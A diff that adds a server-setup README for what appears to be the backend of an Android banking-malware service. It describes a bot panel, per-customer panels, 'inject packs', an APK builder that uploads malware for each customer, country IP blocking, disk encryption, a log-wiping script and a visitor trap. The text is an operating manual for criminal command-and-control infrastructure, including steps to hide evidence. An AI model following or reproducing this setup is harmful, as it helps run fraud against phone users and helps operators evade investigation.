@@ -1,0 +1,105 @@
+
+Backend main server setup
+
+
+- use debian 64, 8 gb RAM at least, 20 gb HDD at least (SSD will be better)
+
+You have to install apache 2, mysql server, php 5.4 or newer, phpmyadmin (optionally)
+Enable rewrite and ssl mods in apache 
+
+- put all in /var/data, not in /var/www
+
+- you can hide entire '/var/data' folder into veracrypt container and mount it to /var/data then. But take a note that you have to re-mount it manually with a password after each server reboot.
+So better to use servers with full hdd crypted.
+
+
+
+Structure:
+
+/var/data/
+	apache_ip_block/ - apache configs to block countries by ip range (see README there)
+	sites-enabled/ - apache configs for virtualhosts
+		bot - main bot panel
+		cp - admin control panel to manage customers, their injects, etc
+		rpaf - to support provide real client ip address to backend panel (you must set FRONTEND ip there - replace 'FRONTEND_IP' word with real ip address)
+		hide_apache_ver - just to hide version from apache pages
+		
+	backend_backup.sh - script to make backup (can be added to crontab)
+	customers.passwd - basic authorization for all customers
+	panel.passwd - basic authorization for admin panel
+	remove_logs.sh - clean logs on the server (can be added to crontab)
+
+	www/
+		apks/ - compiled apk files for all customers (can be downloaded from their panels)
+		base/bot/ - panel sources, dynamic modules should be placed in bot_mods/
+		bot/ - symlinks to clients/. This directory is accessible as server www root -- see sites-enabled/bot.conf
+		clients/ - customers panels. Each panel is copy of the blank/ template.
+			trap - just a trap to log users who went to the link https://backend/adminsdfsdf/111 -- it will be noticed in admin panel
+					trap link is set in frontend nginx config, that installs with frontend_server/setup_client_vps.sh
+					
+			! All panels should be created from admin panel, not manually !
+		
+		cp/ - admin panel, accessible on custom port 							-- see sites-enabled/cp.conf
+			! Builder server connect to cp/builder.php, with basic authorization. 
+			So basic auth to access this panel and file should be specified in Builder configuration file (on Builder server) 
+			Admin panel usage - see below 
+	
+Setup:
+
+
+- Setup db as listed in SQL/README.txt
+
+- Setup config in www/clients/panel2/bot/config_1111.php
+- Update include path to directory that contains core.php (www/base/bot/)
+
+NOTE: blank and trap in www/clients is a system account, DO NOT REMOVE them
+
+- install www/base/bot/aapt/INSTALL.txt to show apk package names
+	set execute permission to aapt binary: chmod +x /var/data/www/base/bot/aapt/aapt
+	
+- Add credentials to customers.passwd with a command: 
+
+	htacess -cb customers.passwd LOGIN PASS
+
+where LOGIN is client folder name ('panel2' by default)
+
+- generate user password for the panel:
+	php -r "echo md5('PASSWORD' . 'SALT');"
+where SALT should be taken from the panel config.php file
+
+Point apache to use /var/data/sites-enabled/ as main virtualhosts folder
+Setup all exactly to match sites-enabled/* settings. 
+Do not change these config files - it can prevent to some scripts do its work.
+
+- open admin panel, add new customer
+- find customer in customers list, edit his injects list to enable or disable inject packs
+
+	
+Admin panel usage:
+	
+First of all - it tests server config and shows debug data at top
+
+Menu:
+
+- add customer -- form to add new customer (it will create panel and database for him)
+	"add mods" panel is not used
+	After adding the customer you can use "Import client" in Builder top menu - to add him fast and Build apk (with auto-uploading to his panel)
+
+- customers -- list of all customers. "Light mode" - disables some functions in panel. Other checkboxes is not used.
+	"Edit injects" allow to add/remove injects in bot panel.
+	
+- backups -- listing of the directory to download and delete backups
+- injects list -- all injects with screenshots and edit form
+- add injects -- just a form to mass add injects records into 'general' database
+- tokens, coordinates - not used
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
